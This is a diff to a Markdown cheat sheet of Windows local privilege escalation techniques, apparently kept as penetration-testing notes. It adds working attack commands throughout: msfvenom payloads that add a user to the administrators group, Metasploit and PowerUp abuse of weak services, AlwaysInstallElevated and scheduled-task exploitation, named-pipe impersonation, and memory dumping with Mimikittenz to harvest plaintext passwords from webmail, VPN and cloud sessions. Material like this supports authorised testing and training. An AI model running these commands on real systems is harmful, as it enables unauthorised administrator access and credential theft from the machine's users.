@@ -60,7 +60,25 @@ $NonDefaultServices = Get-wmiobject win32_service | where { $_.Caption -notmatch
 ---
 
 ### DLL Hijacking
-Using procmon ([Sysinternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite))
+DLL Search Order
+1. Directory application is loaded from
+2. System directory (GetSystemDirectory function returns this path)
+3. 16-bit system directory
+4. Windows directory (GetWindowsDirectory function returns this path)
+5. Current directory
+6. Directories listed in the PATH env variable (does not include per-application path specified by `App Paths` reg key)
+
+Check Static Linking
+- Dependency Walker (GUI)
+- `dumpbin.exe /dependence <exe>` (CLI)
+
+Check Dynamic Linking
+- Process Monitor (GUI)
+- [Rattler](https://github.com/sensepost/rattler/releases) (CLI)
+    - `Rattler_32.exe <exe> 1`
+    - `Rattler_x64.exe <exe> 1`
+
+Using Process Monitor ([Sysinternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite))
 - `Ctrl-L` → `Process Name is <process name>`
 - `Ctrl-H` → `Result is "NAME NOT FOUND"`
 - Run the service and check for any files that the process tried to execute but couldn't find
@@ -96,6 +114,8 @@ Find unquoted service paths
 ```powershell
 wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """  # CMD
 wmic service get name,displayname,pathname,startmode |findstr /i 'auto' |findstr /i /v 'c:\windows\' |findstr /i /v '\"'  # PowerShell
+Get-WmiObject win32_service | select Name,PathName,StartMode,StartName | where {$_.StartMode -ne "Disabled" -and $_.StartName -eq "LocalSystem" -and $_.PathName -notmatch "`"" -and $_.PathName -notmatch "C:\\Windows"} | fl
+Get-ServiceUnquoted                                                                                                       # PowerUp.ps1
 ```
 
 Check whether you can write to any directories in the path to add an executable
@@ -109,6 +129,10 @@ Exploit execute CMD or spawn shell
 msfvenom -p windows/exec CMD='net localgroup administrators <user> /add' -f exe-service -o <file name>.exe
 msfvenom -p <payload> <payload params> -f exe-service -o <file name>.exe
 ```
+```powershell
+exploit/windows/local/trusted_service_path  # Metasploit
+Write-ServiceBinary                         # PowerUp.ps1
+```
 
 Start/restart service
 ```powershell
@@ -119,7 +143,7 @@ sc.exe start <service>
 ---
 
 ### Named Pipes
-Requires SeImpersonatePrivilege
+**Impersonation** Requires SeImpersonatePrivilege to create own pipe and have service connect and impersonate the user
 - Check for current user
 ```powershell
 whoami /priv
@@ -138,13 +162,21 @@ Exploit using [pipeserverimpersonate.ps1](https://github.com/decoder-it/pipeserv
 ```
 - <https://decoder.cloud/2019/03/06/windows-named-pipes-impersonation/>
 
+**Exploiting Existing Pipes**
 List named pipes
 ```powershell
-Get-ChildItem \\.\pipe\
-Get-ChildItem \\.\pipe\<pipename>
+procexp[64].exe  # GUI
+pipesec.exe
+pipelist[64].exe
+[System.IO.Directory]::GetFiles("\\.\pipe\")
 ```
 
+View named pipe DACLs
+```powershell
+pipesec.exe <named pipe>
+```
 
+Exploitation usually requires reverse engineering and writing data to the pipe
 
 ---
 
@@ -155,6 +187,7 @@ Get-Acl <path> | fl
 Get-Acl hklm:\System\CurrentControlSet\services\* | select Path,AccessToString | fl
 Get-Acl hklm:\System\CurrentControlSet\services\* | fl | Out-String -Stream | sls "Users Allow  FullControl" -Context 5,5
 accesschk[64].exe [username] -wvuks hklm\System\CurrentControlSet\services  # recurse, username can be a group e.g. "Everyone"
+AccessEnum.exe  # GUI
 ```
 
 Exploitation
@@ -186,6 +219,8 @@ sc.exe start <service>
 Check if you have permission to modify executable files
 ```powershell
 accesschk[64].exe [username] -wvu <path>  # -s to recurse
+AccessEnum.exe                            # GUI
+gci <path> -recurse | get-acl | select path,owner,accesstostring,group | fl
 Get-ModifiableServiceFile                 # PowerUp.ps1
 ```
 
@@ -209,6 +244,7 @@ sc.exe start <service>
 Check for "SERVICE_CHANGE_CONFIG" permission
 ```powershell
 accesschk[64].exe [username] -wvuc [service|*]  # username can be a group e.g. "Everyone"
+AccessEnum.exe                                  # GUI
 Get-ModifiableService                           # PowerUp.ps1
 ```
 - Look out for:
@@ -226,6 +262,9 @@ sc.exe config <service> binpath=<binary path>
 ```
 ```powershell
 Invoke-ServiceAbuse -Name <service name> -Command <cmd>  # PowerUp.ps1
+```
+```powershell
+exploit/windows/local/service_permissions  # Metasploit
 ```
 
 Start/restart service
@@ -298,7 +337,7 @@ reg query "HKCU\Software\SimonTatham\PuTTY\Sessions\BWP123F42" /v ProxyPassword
 reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
 ```
 
-AutoLogon
+Auto Logon
 ```powershell
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUsername
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
@@ -358,7 +397,33 @@ Invoke-SessionGopher -AllDomain -u <user> -p <pass>  # Using another account
 ---
 
 ### Memory
-Process Dump
+Dump process memory (or search memory directly) to find meaningful data (e.g. plaintext passwords)
+- "Create Dump File" from Windows Task Manager
+- `procdump.exe -ma <pid>  # SysInternals`
+
+```powershell
+Import-Module <Out-MiniDump.ps1 path>  # PowerSploit
+Out-Minidump (Get-Process -Id <pid>)
+```
+
+[Mimikittenz](https://github.com/putterpanda/mimikittenz)
+```powershell
+Import-Module <Invoke-mimikittenz.ps1 path>
+Invoke-mimikittenz
+```
+
+Category | Supported
+:--- | :---
+Webmail | Gmail Office365 Outlook Web
+Accounting | Xero MYOB
+Remote Access | Juniper SSL-VPN Citrix NetScaler Remote Desktop Web Access 2012
+Developement | Jira Github Bugzilla Zendesk Cpanel
+IHateReverseEngineers | Malwr VirusTotal AnubisLabs
+Misc | Dropbox Microsoft Onedrive AWS Web Services Slack Twitter Facebook
+
+---
+
+Example
 - On Kali
 ```powershell
 msfconsole
@@ -379,23 +444,6 @@ run
 strings <iexplore.exe dump> | grep "Authorization: Basic"
 echo -ne <b64 encoded creds> | base64 -d
 ```
-
----
-
-[Mimikittenz](https://github.com/putterpanda/mimikittenz)
-```powershell
-Import-Module <Invoke-mimikittenz.ps1 path>
-Invoke-mimikittenz
-```
-
-Category | Supported
-:--- | :---
-Webmail | Gmail Office365 Outlook Web
-Accounting | Xero MYOB
-Remote Access | Juniper SSL-VPN Citrix NetScaler Remote Desktop Web Access 2012
-Developement | Jira Github Bugzilla Zendesk Cpanel
-IHateReverseEngineers | Malwr VirusTotal AnubisLabs
-Misc | Dropbox Microsoft Onedrive AWS Web Services Slack Twitter Facebook
 
 ---
 
@@ -446,7 +494,7 @@ dir /s /b C:\*vnc.ini
 
 General
 ```powershell
-findstr /si passw *.bat *.cmd *.csv *.dat *.eml *.evt *.inf *.ini *.log *.ps1 *.sav *.sys *.txt *.vbs *.xml
+findstr.exe /si passw *.bat *.cmd *.csv *.dat *.eml *.evt *.inf *.ini *.log *.ps1 *.sav *.sys *.txt *.vbs *.xml
 dir /s /b *pass* == *cred* == *vnc* == *.config*
 ```
 
@@ -468,6 +516,7 @@ Search for modifiable directories which have autoruns
 ```powershell
 Get-ModifiableRegistryAutoRun  # PowerUp.ps1
 autorunsc[64].exe              # SysinternalsSuite
+regedit.exe                    # GUI
 reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\R"
 reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
 reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce"
@@ -482,6 +531,7 @@ reg query "HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceSer
 Check whether you can modify the file
 ```powershell
 accesschk[64].exe -wvu <autorun .exe>
+AccessEnum.exe  # GUI
 ```
 
 Exploit
@@ -498,6 +548,9 @@ Check if enabled
 ```powershell
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+regedit.exe                                    # GUI
+Get-RegistryAlwaysInstallElevated              # PowerUp.ps1
+exploit/windows/local/always_install_elevated  # Metasploit
 ```
 - Enabled if `1`
 
@@ -505,6 +558,9 @@ Create .msi file to be executed
 ```powershell
 msfvenom -p windows/exec CMD='net localgroup administrators <user> /add' -f msi-nouac -o setup.msi
 msfvenom -p <payload> <payload params> -f msi-nouac -o setup.msi
+Write-UserAddMSI                               # PowerUp.ps1
+exploit/windows/local/always_install_elevated  # Metasploit
+Advanced Installer
 ```
 - Place in directory such as `C:\Temp`
 
@@ -520,14 +576,23 @@ msiexec /quiet /qn /i <setup.msi path>
 Check for overwritable binaries
 - Autoruns[64].exe [Sysinternal Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)
     - Scheduled Tasks tab, note file paths
+
 ```powershell
-schtasks.exe /query
+schtasks.exe /query /TN <task name> /xml
 Get-ModifiableScheduledTaskFile  # PowerUp.ps1
+```
+
+```powershell
+$schedule = new-object -com("Schedule.Service")
+$schedule.connect()
+$tasks = $schedule.getfolder("\").gettasks(0)
+$tasks | fl
 ```
 
 Check if you have write access to the binary
 ```powershell
 accesschk[64].exe -w <binary>
+AccessEnum.exe  # GUI
 ```
 
 Create binary payload
@@ -547,6 +612,7 @@ Check for missing binaries of scheduled tasks
 Check if you have write access to the directory of the missing binary
 ```powershell
 accesschk[64].exe -w <missing binary directory>
+AccessEnum.exe  # GUI
 ```
 
 Create binary payload
@@ -559,21 +625,33 @@ msfvenom -p <payload> <payload params> -f exe -o <missing binary>.exe
 ---
 
 ## Hot Potato
-[Tater.ps1](https://github.com/Kevin-Robertson/Tater)
+- [Tater.ps1](https://github.com/Kevin-Robertson/Tater)
 ```powershell
 powershell -nop -ep bypass
 Import-Module <Tater.ps1 path>
 Invoke-Tater -Trigger 1 -Command <cmd>
 ```
+- Potato (breenmachine)
+- SmashedPotato.cs (Cn33liz)
 
 ---
 
 ## Startup Applications
+Check whether startup applications are modifiable and replace them with a malicious .exe
 ```powershell
 wmic startup get caption,command
-dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"
-dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 
 ```
+```powershell
+icacls.exe <path>
+Get-Acl <path> | fl
+```
+- All users:
+    - "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"
+    - "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+
+- Specific users:
+    - "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"
+    - "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 
 ---
 
@@ -609,6 +687,7 @@ Unquoted service paths
 ```powershell
 wmic service get name,displayname,pathname,startmode |findstr /i “auto” |findstr /i /v “c:\windows\\” |findstr /i /v “””  # CMD
 wmic service get name,displayname,pathname,startmode |findstr /i 'auto' |findstr /i /v 'c:\windows\' |findstr /i /v '\"'  # PowerShell
+Get-WmiObject win32_service | select Name,PathName,StartMode,StartName | where {$_.StartMode -ne "Disabled" -and $_.StartName -eq "LocalSystem" -and $_.PathName -notmatch "`"" -and $_.PathName -notmatch "C:\\Windows"} | fl
 ```
 
 Search for string (e.g. passwords - case insensitive)
